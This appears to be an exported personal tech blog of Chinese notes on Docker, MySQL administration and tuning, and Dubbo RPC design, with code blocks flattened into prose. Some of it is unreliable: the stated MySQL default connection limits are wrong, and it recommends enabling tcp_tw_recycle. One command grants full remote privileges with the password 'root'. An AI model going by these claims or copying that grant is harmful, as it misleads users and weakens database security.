    <content type="text"><![CDATA[what is docker? 百度 告诉我们docker是一个容器 作为java码头搬砖的 我想到了 spring也是叫做容器 那么容器是一个什么样的概念? 不由想到了水缸—容器 容器装载水的 与水毫无关系 spring容器 IOC AOP 都晓得IOC 把对象创建交给spring管理 然后加载到jvm中运行java 程序AOP 面向切面编程.其实就是提供了一个切面模式.能够很好地控制类的加载顺序.或者类的执行顺序 但是本质上spring容器就是装载java程序的 那么docker?装载各种程序的.暂时可以理解为一个系统.系统也是一个容器.装载我们运行的程序window装载 exe. linux装载rpm. android 装载一类apk的程序 ios装载一类ipa的程序 {———-} 那么官网是怎么吹皮的呢?Docker是推动集装箱运动的公司，也是唯一一家能够解决混合云中的每个应用的集装箱平台提供商。当今的企业面临数字化转型的压力，但受到现有应用程序和基础架构的制约，同时合理化日益多样化的云，数据中心和应用程序体系结构。Docker实现了应用程序和基础架构与开发人员和IT运营商之间的真正独立性，从而发挥其潜力，并创建更好的协作和创新模式。 docker给我们提供了什么样的先进功能? 也是我们要用它的原因 1.敏捷 通过13X加速软件开发和部署，并立即响应客户的需求。2.可移植性一劳永逸地消除“在我的机器上工作”。在本地和云环境中获得独立性。3.安全通过内置的安全功能和配置，在整个生命周期中提供更安全的应用程序。4.节约成本优化基础架构资源的使用并简化操作，以节省总成本的50％。 在使用上: 1.简单Docker为应用创建和编排提供了强大的工具2.透明度采用开源技术和模块化设计构建，可轻松集成到现有环境中。3.独立Docker在开发人员和IT部门之间以及应用程序和基础架构之间创建了一个关注点，以解锁创新 在行业上1.现代化传统应用[MTA]Docker的第一步是现有的应用程序组合。将现有应用程序打包到容器中可以立即提高安全性，降低成本并获得云的便携性。这种转换将现代属性应用于遗留应用程序 - 所有这些都不需要更改一行代码。 2.混合云云迁移，多云或混合云基础架构需要应用程序的无缝移植。Docker将应用程序及其依赖关系打包到一个独立的容器中，使它们可以移植到任何基础架构中 一劳永逸地消除“在我的机器上工作”的问题。Docker认证的基础架构确保集装箱化的应用程序一直工作。 3.持续集成和部署[DEVOPS]集成现代方法并通过集成Docker和DevOps来自动化开发流程。通过消除应用程序冲突并提高开发人员的生产力，容器的独立性使其有助于快速变化的环境。Docker实现了关注的真正分离，加速了DevOps流程的采用。 4.微服务Docker容器在设计上是轻量级的，是实现微服务应用程序开发的理想选择。加速作为单个应用程序组成的数十个或数百个容器的开发，部署和回滚。无论是构建新的微服务还是将小块服务转换为更小的服务，简单易用的工具都可以轻松组合，部署和维护复杂的应用程序。 docker安装:https://docs.docker.com/engine/installation/ docker与虚拟机区别 可看出虚拟机拥有较强的隔离技术。虚拟机承载的镜像都是互相独立的。而且虚拟机中执行的进程是被虚拟机管理的，并不与主机进程等价。 docker容器技术中，最主要一点就是容器进程与主机进程等价。省去了虚拟机进程管理的消耗。但是这样也带来了问题。容器隔离度安全问题。 另外docker中可以两个应用共用一个库。而虚拟机因为隔离性太强，只能各用个的。]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql最大连接数]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-max-connects%2F</url>
    <content type="text"><![CDATA[linux默认1000 window 默认2000 还要根据文件系统 性能 来调节 mysql连接数]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL常用命令]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-shell%2F</url>
    <content type="text"><![CDATA[mysql常用sql命令123456789101112131415161718192021222324252627mysql -u root -puse user;drop database user;use mysqlselect Host,User,authentication_string from mysql.user;grant all privileges on *.* to &apos;dbuser&apos;@&apos;115.171.60.75&apos;identified by &apos;root&apos; with grant option;all insert update ...*.* : 数据库.表名root : 用户名115.170.*.* : 远程访问ip地址刷新配置flush privileges;UPDATE user SET password=PASSWORD(&quot;新密码&quot;) WHERE user=&apos;你的用户名&apos;;FLUSH PRIVILEGES;delete from mysql.user where user=root and host = 115.171.60.75; {———-} 安装原装地址：http://www.cnblogs.com/5201351/p/4912614.html12345678910111213141516171819202122232425262728293031卸载mriadb包[root@5201351 ~]# rpm -qa|grep mariadbmariadb-libs-5.5.41-2.el7_0.x86_64[root@5201351 ~]# rpm -e mariadb-libs-5.5.41-2.el7_0.x86_64 --nodeps安装mysql 安装包 https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.20-1.el7.x86_64.rpm-bundle.tarrpm -ivh *.rpm安装顺序 common libs client server两种初始化启动方式[root@5201351 ~]# mysql_install_db --datadir=/var/lib/mysql //必须指定datadir,执行后会生成~/.mysql_secret密码文件[root@5201351 ~]# mysqld --initialize //新版的推荐此方法，执行生会在/var/log/mysqld.log生成随机密码启动mysql[root@5201351 ~]# chown mysql:mysql /var/lib/mysql -R[root@5201351 ~]# systemctl start mysqld.service 查看密码cat ~/.mysql_secretcat /var/log/mysqld.log登录[root@5201351 ~]# mysql -uroot -p&apos;)j#)=uRig4yJ&apos;mysql&gt; set password=password(&apos;www.cnblogs.com/5201351&apos;);创建用户以及分配权限mysql&gt; create user &apos;root&apos;@&apos;192.168.100.2&apos; identified by &apos;QQ5201351&apos;;mysql&gt; GRANT ALL PRIVILEGES ON dbname.* to &apos;root&apos;@&apos;192.168.100.2&apos;;mysql&gt; flush privileges 常用sql12ALTER TABLE table_name RENAME TO new_table_name]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fabout-agreement%2F</url>
    <content type="text"><![CDATA[what 协议？人民币算不算是一种协议？买家和卖家协议一张纸为 10元 、50元、100元 so ： 协议在互联网届就是发送方和接收方商量好的一种消息模式， Http：规定两个ip、一个发送ip、一个接收ip、这两个ip进行数据交互时候、先握手、确定数据畅通、然后在进行数据通信、握手协议：规定握手消息格式【一系列参数的排序】、数据通信规定http发送消息体消息格式。 {———-}]]></content>
      <categories>
        <category>java</category>
        <category>agreement</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql存储过程]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-stored-procedure%2F</url>
    <content type="text"><![CDATA[1234DELIMIT ; CREATE DROP ();DELIMIT // 为什么使用存储过程有过统计:一个事务提交放到service层 大概一秒能处理500个(好像是2ms一个.算上网络延迟)而使用mysql存储过程 一秒钟大概能处理2000个事物 阿里编码规范有讲不适用存储过程.维护起来很困难.但是该用还得用.像秒杀.]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL版本选择]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-version-selected%2F</url>
    <content type="text"><![CDATA[学习阿里mysql笔记 mysql 历史过程中产生了三个版本 Percona Server : 有领先的MYSQL咨询公司 Percona公司发布 Maria DB : MYSQL最早创始人 重新做的一个版本 MYSQL : Oracle公司收购的版本 关于mysql存储引擎：MyISAM、InnoDB、XtraDB12345最早、最原始的存储引擎MyISAM、缺点不支持事务、优点 读写性能要好InnoDB 支持了事务、并把数据操作记录到日志、安全性较好、读写性能也有很大提高、稍低MyISAM(mysql 5.5之后默认存储引擎选取了InnoDB)XtraDB 是InnoDB增强版本、被设计用来更新计算机硬件系统性能、同时还包含了一些高性能环境下新特性。 {———-} 1234567891011121314Percona Server发展到10.X版本、最接近mysql企业版本最主要特性、提供了存储引擎 XtraDB、还提供PXC高可用解决方案、还有percona-tookit等DBA管理工具箱、【据使用经验 这个版本性能非常非常高的 推荐排名第一位】MariaDB 目标、取代现在mysql、oracle的mysql闭源危机使用完全兼容mysql。优点支持脚本初始化、与最初mysql代码改动最大、成熟度较低支持新工具、新功能在不断完善、、【第二推荐】MYSQL ：官方版本、使用量最多、后续趋势会被其他两种取代、性能方面、在企业版本会增加一些新功能、但是收费【第三推荐、对性能要求不高、稳定版本】 InnoDB :支持事务 、行级锁、外键]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【绩效衡量】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-performance-measurement%2F</url>
    <content type="text"><![CDATA[8.13.1测量表达式和函数的速度8.13.2使用您自己的基准8.13.3使用performance_schema测量绩效要衡量绩效，请考虑以下因素： 无论您是在安静系统上测量单个操作的速度，还是在一段时间内如何操作一组操作（ “ 工作负载 ”）。通过简单的测试，您通常可以测试更改一个方面（配置设置，表上的索引集，查询中的SQL子句）如何影响性能。基准测试通常是长时间运行和精心设计的性能测试，其结果可能决定硬件和存储配置等高级选择，或者升级到新MySQL版本的时间。 对于基准测试，有时您必须模拟繁重的数据库工作负载才能获得准确的图像。 表现可能会因许多不同的因素而有所不同，因为几个百分点的差异可能不是决定性的胜利。在不同的环境中进行测试时，结果可能会发生相反的变化。 某些MySQL功能根据工作负载提供帮助或无法帮助提高性能。为了完整性，请始终在打开和关闭这些功能的情况下测试性能。尝试与每个工作负载的两个最重要的功能是 MySQL查询缓存，以及 适应性的散列索引的InnoDB表。 本节从单个开发人员可以执行的简单和直接测量技术发展到需要额外专业知识来执行和解释结果的更复杂测量技术。 {———-} 8.13.1测量表达式和函数的速度要测量特定MySQL表达式或函数的速度，请BENCHMARK()使用mysql客户端程序调用该函数。它的语法是 。返回值始终为零，但mysql 打印一行显示语句执行的时间。例如： BENCHMARK(loop_count,expression) MySQL的&gt; SELECT BENCHMARK(1000000,1+1); ———————— +| 基准（1000000,1 + 1）| ———————— +| 0 | ———————— +1排（0.32秒）该结果在Pentium II 400MHz系统上获得。它表明MySQL可以在0.32秒内在该系统上执行1,000,000个简单的加法表达式。 内置的MySQL函数通常是高度优化的，但可能有一些例外。 BENCHMARK()是一个很好的工具，可以找出某些功能是否是您的查询的问题。 8.13.2使用您自己的基准对您的应用程序和数据库进行基准测试，以找出瓶颈所在。在修复一个瓶颈（或者用“ 虚拟 ”模块替换它）之后，您可以继续识别下一个瓶颈。即使您的应用程序的整体性能目前是可接受的，您至少应该为每个瓶颈制定计划，并决定如果有一天您真的需要额外的性能，如何解决它。 免费的基准测试套件是开源数据库基准测试，可从http://osdb.sourceforge.net/获得。 仅在系统负载很重时才会出现问题。我们有许多客户在生产（已测试）系统并遇到负载问题时与我们联系。在大多数情况下，性能问题可能是由于基本数据库设计问题（例如，高负载下的表扫描不好）或操作系统或库的问题。大多数情况下，如果系统尚未投入生产，这些问题将更容易解决。 为了避免这样的问题，在最糟糕的负载下对整个应用程序进行基准测试： 该mysqlslap程序可以是用于模拟由多个客户端同时发出查询产生的高负载有帮助的。请参见第4.5.9节“ mysqlslap - 加载仿真客户端”。 您还可以尝试使用基准测试程序包，例如SysBench和DBT2，可在 https://launchpad.net/sysbench和 http://osdldbt.sourceforge.net/#dbt2获得。 这些程序或软件包可以使系统瘫痪，因此请务必仅在开发系统上使用它们。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【SQL语句】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-sentence%2F</url>
    <content type="text"><![CDATA[1、select语句 1234567891011121、删除无效括号【为了增加运算速度牺牲的可读性、mysql会做类似优化】2、持续折叠3、恒定条件去除【为了更好的逻辑可读性重复字段=固定值】4、及时检测无效常量表达式5、关于havingwhere 、如果不与group by、或者count、min、等聚合函数一起使用、尽量不要使用6、where 表达式尽量简单、便于快速建立where评估表7、查询其他表之前首先查询所有常量表【 SELECT * FROM t WHERE primary_key=1; SELECT * FROM t1,t2 WHERE t1.primary_key=1 AND t2.primary_key=t1.id;】 {———-} 2、范围优化对于两种索引结构使用不同的范围条件【hash索引、B树索引】 ==========mmp 太难了 没办法写下去 只能贴图了 以后慢慢品鉴]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见MYSQL调优策略]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-total-2%2F</url>
    <content type="text"><![CDATA[调优层次：硬件层、磁盘IO、文件系统层、 硬件层1234修改服务器BIOS设置1.选择Performance Per Watt Optimized(DAPC)模式 、发挥cpu最大性能2.Memory Frequency(内存频率)选择 Maximum Performance (最佳性能)3.内存设置菜单中，启用Node Interleaving 避免NUMA问题 磁盘IO1231.使用SSD磁盘(瞬时写入非常高、还可以避免很多技术问题)2.如果是磁盘阵列存储，建议阵列卡同时配备CACHE及BBU模块，可以明显提升IOPS。3.raid级别尽量选择raid10.而不是raid5(双io方式、也能提高安全性等等) 文件系统层1231.使用deadline/noop这两种I/O调度器。千万别用cfq2.使用xfs文件系统、千万别用ext3、ext4勉强可用、但是事务量很大一定要用xfs3.文件系统mount参数中增加：noatime，nodiratime，nobarrier几个选项(nobarrier是xfs文件系统特有的) 内核参数优化 1.修改vm.swappiness参数，降低swap使用率，RHEL7/centos7以上则慎重设置为0，可能引发OOM(物理内存使用到了90%之后才去修改、设为5-10就可以) 2.调整vm.dirty_background_ratio(脏数据量占内存量百分比、超过后将脏数据刷到磁盘、最大值（阻塞写）10%)、vm.dirty ratio(标准值（非阻塞写）5%) 内核参数、以确保能持续将脏数据刷新到磁盘，避免瞬I/O写，产生等待。 3.调整net.ipv4.tcp_tw_recycle、net.ipv4.tcp_tw_reuse都设置为1、减少Time_wait,提高TCP效率 {———-} MYSQL参数优化建议]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【总方向】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-total%2F</url>
    <content type="text"><![CDATA[老生常谈 SQL 优化而且一百度一堆，却没有一个令人满意的 秉承官方文档 原则 【MYSQL第八章 SQL优化】 优化方向：SQL查询and存储1234sql语句sql索引sql数据库结构sql表【InnoDb表、MyISAM表、Memory表】 缓存12查询优化器缓冲和高速缓冲区 锁1优化锁定操作 MYSQL服务器1234系统因素-并发量磁盘IO内存使用网络使用 检查1检查线程信息 {———-}]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dubbo 框架设计]]></title>
    <url>%2F2018%2F03%2F24%2Frpc%2Fdubbo-0%2F</url>
    <content type="text"><![CDATA[假设我们开发一个rpc远程调用框架 那么这个框架需要怎么去写 1、首先有远程配置中心config 2、有服务代理层【包装业务上的服务做一个代理】 3、有服务注册中心【代理了服务之后 向该注册中心注册服务代理】 4、有路由【远程调用先走路由获取服务代理实例、集群必备的东西】 5、有远程调用层【发起服务调用】 6、有网络传输层、有信息交换层【这个是一个传输协议的实现层】 7、有序列化层【针对网络IO信息编码方式的统一、传输协议最基本的东西】 8、服务监控【不属于RPC、但是服务监控必不可少】 总结： 核心配置：服务注册中心、服务代理和服务调用 优化配置：配置中心、服务监控、 基石配置：网络传输以及协议、序列化方式的定制 {———-} dubbo框架设计 简单用自己的语言描述这个图 1、左上角 Dubbo Framework 2、左上角往右简单标识 每个颜色代表什么意思、更好理解图中数据流向 消费者、提供者、开始、接口、类、继承关系、调用链方向、依赖方向 3、左侧一竖列、黑体字 service\config、等等 服务接口【service】、配置层【config】、服务代理层【proxy】、注册中心【registry】、 路由【cluster】、监控中心【monitor】、远程调用【protocol】、 信息交换【exchange】、网络传输【transport】、数据序列化【serialize】 结合自己所想做一个分类 核心配置：服务代理层【proxy】、注册中心【registry】、远程调用【protocol】 优化配置：配置层【config】、路由【cluster】、监控中心【monitor】 基石配置：信息交换【exchange】、网络传输【transport】、数据序列化【serialize】 简单猜想一下dubbo这么设计的代码架构1234567891011121314151617181920212223service：对外暴露接口 API与SPI分离config：核心referenceConfig、ServiceConfig serviceConfig----获取远程仓库配置、获取文件配置、貌似还可以获取环境变量 【实质上跟修改本地host一个道理、规定了一个locahost代理 然后操作系统去解析这个配置】referenceConfig--是消费端配置、其应该是从服务端获取配置信息proxy：不由想到代理模式、原业务逻辑bean不变、新建bean来实现原bean的代理【也算是一种封装】registry：注册中心、看过eureka、底层内存中维护了 一个双map结构数据列表、维护服务实例、服务地址、以及代理service等cluster：路由器、想到最简单的就是url转发、当然肯定没这么简单、应该还会有、实时获取服务列表、负载均衡算法等等monitor：监控中心、这个web服务把各路信息提上来做一个展示、应该没啥、最多维护一个硬盘文件protocol：远程调用、怎么调用--不太清楚--再看看exchange：信息交换、request、response封装transport：网络传输、大名鼎鼎的netty就在这吧~~seriallize：数据序列化、提供多重序列化方式、hessian【本地存根方式】、rmi等等吧]]></content>
      <categories>
        <category>java</category>
        <category>rpc</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dubbo分析]]></title>
    <url>%2F2018%2F03%2F24%2Frpc%2Fdubbo-1%2F</url>
    <content type="text"><![CDATA[1手册地址:https://gitee.com/none_heart/RPC/raw/master/dubbo/doc/dubbo-用户指南-带标签.pdf RPC Remote Procedure call 远程过程调用 一个RPC框架有几个特点:远程调用.协议.暴露端口方式稳定性.一致性.容错性并发性.简单插入性.高度解耦 那么从这几个方面来思考dubbo 协议:1234567891011Dubbo缺省协议采用单一长连接和NIO异步通讯，适合于小数据量大并发的服务调用，以及服务消费者机器数远大于服务提供者机器数的情况。缺省协议，使用基于mina1.1.7+hessian3.2.1的tbremoting交互。连接个数：单连接连接方式：长连接传输协议：TCP传输方式：NIO异步传输序列化：Hessian二进制序列化适用范围：传入传出参数数据包较小（建议小于100K），消费者比提供者个数多，单一消费者无法压满提供者，尽量不要用dubbo协议传输大文件或超大字符串。适用场景：常规远程服务方法调用 {———-} 高可用-容错性: 五种回调方式:Failover.Failfast.Failsafe.Failback.Forking应对不同场景使用不同回调方式 高可用-负载均衡dubbo支持 随机.轮询.最小调用次数调用.hash值余数调用 并发-线程没什么可说的.该用就得用.但是不能乱用. 服务暴露地址:多协议.多注册方式.无中心化 参数校验.服务分组等等]]></content>
      <categories>
        <category>java</category>
        <category>rpc</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【查询器优化·一】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-selector-1%2F</url>
    <content type="text"><![CDATA[8.8.1使用EXPLAIN优化查询 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849该EXPLAIN语句提供有关MySQL如何执行语句的信息：EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。当EXPLAIN与可解释的语句一起使用时，MySQL会显示来自优化器的关于语句执行计划的信息。也就是说，MySQL解释了它将如何处理该语句，包括有关表如何连接以及按何种顺序的信息。有关使用 EXPLAIN获取执行计划信息的信息，请参见第8.8.2节“EXPLAIN输出格式”。当EXPLAIN与 可解释的语句一起使用时，它显示在命名连接中执行的语句的执行计划。请参见第8.8.4节“获取命名连接的执行计划信息”。 FOR CONNECTION connection_id对于SELECT语句， EXPLAIN产生可以使用显示的附加执行计划信息 SHOW WARNINGS。请参见 第8.8.3节“扩展EXPLAIN输出格式”。EXPLAIN对于检查涉及分区表的查询很有用。请参见 第22.3.5节“获取有关分区的信息”。该FORMAT选项可用于选择输出格式。TRADITIONAL以表格格式显示输出。如果没有FORMAT选项，这是默认值 。 JSON格式以JSON格式显示信息。在帮助下EXPLAIN，您可以看到应该在哪里添加索引，以便通过使用索引查找行来更快地执行语句。您还可以 EXPLAIN用来检查优化程序是否以最佳顺序加入表。为了给优化器提示使用与SELECT语句中命名表的顺序相对应的连接顺序 ，请使用SELECT STRAIGHT_JOIN而不是仅仅开始语句SELECT。（请参见 第13.2.9节“SELECT语法”。）但是， STRAIGHT_JOIN可能会阻止使用索引，因为它会禁用半连接转换。看到 第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。优化器跟踪有时可以提供与之相辅相成的信息EXPLAIN。但是，优化器跟踪格式和内容在版本之间可能会发生变化。有关详细信息，请参阅 MySQL内部：跟踪优化器。如果您在确定索引时没有使用索引时遇到问题，请运行ANALYZE TABLE以更新表格统计信息（如键的基数），这些索引可能会影响优化程序的选择。请参见 第13.7.2.1节“ANALYZE TABLE语法”。注意EXPLAIN也可以用于获取有关表中列的信息。 是和的 同义词。有关更多信息，请参见第13.8.1节“DESCRIBE语法”和 第13.7.5.5节“SHOW COLUMNS语法”。 EXPLAIN tbl_nameDESCRIBE tbl_nameSHOW COLUMNS FROM tbl_name {———-} 8.8.2 EXPLAIN输出格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779该EXPLAIN语句提供有关MySQL如何执行语句的信息。 EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。EXPLAIN为SELECT语句中使用的每个表返回一行信息 。它按照MySQL在处理语句时读取它们的顺序列出输出中的表。MySQL使用嵌套循环连接方法解析所有连接。这意味着MySQL从第一个表中读取一行，然后在第二个表，第三个表等中找到匹配的行。处理完所有表后，MySQL将通过表列表输出所选列和回溯，直到找到有更多匹配行的表。下一行从该表中读取，并且该过程继续下一个表。EXPLAIN输出包括分区信息。另外，对于SELECT 语句，EXPLAIN生成扩展信息，可以按照SHOW WARNINGS以下 方式显示 EXPLAIN（参见 第8.8.3节“扩展EXPLAIN输出格式”）。注意在较旧的MySQL版本中，使用EXPLAIN PARTITIONS和 生成分区和扩展信息 EXPLAIN EXTENDED。这些语法仍然被认为是向后兼容的，但分区和扩展输出现在默认启用，所以PARTITIONS 和EXTENDED关键字是多余的，并且已被弃用。它们的使用会导致警告，并且它们将EXPLAIN在未来的MySQL版本中从语法中删除。您不能在相同的语句中一起使用弃用PARTITIONS 和EXTENDED关键字 EXPLAIN。另外，这些关键字都不能与FORMAT选项一起使用 。注意MySQL Workbench具有Visual Explain功能，可提供EXPLAIN输出的可视表示 。请参阅 教程：使用说明来提高查询性能。EXPLAIN输出列EXPLAIN加入类型解释额外信息EXPLAIN输出解释EXPLAIN输出列本部分介绍由产生的输出列 EXPLAIN。后面几节提供了关于type 和 Extra 列的更多信息 。每个输出行都EXPLAIN 提供有关一个表的信息。每行包含表8.1“汇总输出列”中汇总的值 ，并在表格后面详细介绍。列名显示在表格的第一列中; 第二列提供FORMAT=JSON使用时输出中显示的等效属性名称 。表8.1 EXPLAIN输出列柱 JSON名称 含义id select_id 该SELECT标识符select_type 没有 该SELECT类型table table_name 输出行的表格partitions partitions 匹配的分区type access_type 连接类型possible_keys possible_keys 可能的索引选择key key 该指数实际选择key_len key_length 所选键的长度ref ref 列与索引进行比较rows rows 要检查的行的估计filtered filtered 按表条件过滤的行的百分比Extra 没有 附加信息注意JSON属性NULL不会显示在JSON格式的EXPLAIN 输出中。id（JSON名： select_id）的SELECT标识符。这是SELECT查询内部的连续编号 。NULL如果该行引用其他行的联合结果，则该值可以是该值。在这种情况下， table列显示的值喜欢 以指示该行是指行的联合与的值 和 。 &lt;unionM,N&gt;idMNselect_type （JSON名称：无）类型SELECT，可以是下表中显示的任何类型。JSON格式EXPLAIN将SELECT类型公开 为a的属性 query_block，除非它是 SIMPLE或PRIMARY。表中还显示了JSON名称（如果适用）。select_type 值 JSON名称 含义SIMPLE 没有 简单SELECT（不使用 UNION或子查询）PRIMARY 没有 最 SELECTUNION 没有 第二次或以后的SELECT声明 UNIONDEPENDENT UNION dependent（true） 第二个或更晚的SELECT语句 UNION依赖于外部查询UNION RESULT union_result 结果UNION。SUBQUERY 没有 首先SELECT在子查询中DEPENDENT SUBQUERY dependent（true） 首先SELECT在子查询中，依赖于外部查询DERIVED 没有 派生表MATERIALIZED materialized_from_subquery 物化子查询UNCACHEABLE SUBQUERY cacheable（false） 无法缓存结果的子查询，必须对外部查询的每一行重新评估UNCACHEABLE UNION cacheable（false） 第二个或更高版本选择UNION 属于不可缓存的子查询（请参阅 UNCACHEABLE SUBQUERY）DEPENDENT通常表示使用相关的子查询。请参见 第13.2.10.7节“相关子查询”。DEPENDENT SUBQUERY评估与评估不同UNCACHEABLE SUBQUERY。因为DEPENDENT SUBQUERY，子查询对于来自外部上下文的变量的每个不同值集合仅重新评估一次。因为 UNCACHEABLE SUBQUERY子查询是针对外部上下文的每一行重新评估的。子查询的可缓存性与查询缓存中查询结果的缓存不同（ 第8.10.3.1节“查询缓存如何操作”中有描述）。子查询缓存发生在查询执行期间，而查询缓存仅在查询执行完成后用于存储结果。当您指定FORMAT=JSON时 EXPLAIN，输出没有直接等价于的单个属性 select_type; 该 query_block属性对应于给定的SELECT。相当于SELECT刚刚显示的大多数子查询类型的属性都可用（示例 materialized_from_subquery适用 MATERIALIZED），并在适当时显示。SIMPLE或者没有JSON等价物 PRIMARY。select_type非SELECT语句 的值显示受影响的表的语句类型。例如，select_type是 DELETE对 DELETE报表。table（JSON名： table_name）输出行涉及的表的名称。这也可以是以下值之一：&lt;unionM,N&gt;：该行指与行的工会 id的价值 M和 N。&lt;derivedN&gt;：该行指的是具有id值为 的行的派生表结果N。例如，派生表可能来自FROM子句中的子查询 。&lt;subqueryN&gt;：该行指的是具有id 值为的行的物化子查询的结果N。请参见 第8.2.2.2节“使用实现优化子查询”。partitions（JSON名： partitions）记录将与查询匹配的分区。该值适用NULL于未分区的表格。请参见 第22.3.5节“获取有关分区的信息”。type（JSON名： access_type）连接类型。有关不同类型的说明，请参阅 EXPLAIN 联接类型。possible_keys（JSON名： possible_keys）该possible_keys列指示MySQL可以从中选择哪些索引来查找此表中的行。请注意，此列完全独立于输出中显示的表的顺序 EXPLAIN。这意味着某些键possible_keys可能无法在生成的表格顺序中使用。如果此列是NULL（或在JSON格式的输出中未定义），则没有相关索引。在这种情况下，您可以通过检查该WHERE 子句来检查是否引用适合索引的一列或多列，从而提高查询的性能。如果是这样，请创建一个适当的索引并EXPLAIN再次检查查询 。请参见 第13.1.8节“ALTER TABLE语法”。要查看表格具有哪些索引，请使用。 SHOW INDEX FROM tbl_namekey（JSON名：key）该key列表示MySQL实际决定使用的密钥（索引）。如果MySQL决定使用其中一个possible_keys 索引来查找行，那么该索引将被列为关键值。有可能key会命名该值中不存在的索引 possible_keys。如果没有possible_keys索引适合查找行，则会发生这种情况，但查询选择的所有列都是其他索引的列。也就是说，指定的索引涵盖了选定的列，因此虽然它不用于确定要检索哪些行，但索引扫描比数据行扫描更有效。因为InnoDB，即使查询也选择主键，辅助索引可能会覆盖所选列，因为InnoDB将主键值存储在每个辅助索引中。如果 key是NULL，MySQL发现没有索引可用于更高效地执行查询。要强制MySQL使用或忽略列出的索引 possible_keys列，使用 FORCE INDEX，USE INDEX或IGNORE INDEX在您的查询。请参见第8.9.4节“索引提示”。对于MyISAM表格，运行 ANALYZE TABLE有助于优化器选择更好的索引。对于 MyISAM表格，myisamchk --analyze也是一样。请参见 第13.7.2.1节“ANALYZE TABLE语法”和 第7.6节“MyISAM表维护和崩溃恢复”。key_len（JSON名： key_length）该key_len列表示MySQL决定使用的密钥的长度。这个值 key_len使您能够确定MySQL实际使用的多部分密钥的多少部分。如果key专栏说 NULL，len_len 专栏也说NULL。由于密钥存储格式，密钥长度大于该可以是列一个NULL 比一个NOT NULL列。ref（JSON名：ref）该ref列显示哪些列或常量与列中指定的索引进行比较以 key从表中选择行。如果值是func，则使用的值是某个函数的结果。要查看哪个功能，请使用 SHOW WARNINGS以下内容 EXPLAIN查看扩展 EXPLAIN输出。该函数实际上可能是算术运算符等运算符。rows（JSON名： rows）该rows列表示MySQL认为它必须检查以执行查询的行数。对于InnoDB表格，这个数字是一个估计值，可能并不总是准确的。filtered（JSON名： filtered）该filtered列表示将根据表条件过滤的表行的估计百分比。即，rows 显示检查的估计行数， rows× filtered/ 100显示将与先前表连接的行数。Extra （JSON名称：无）此列包含有关MySQL如何解析查询的其他信息。有关不同值的说明，请参阅 EXPLAIN 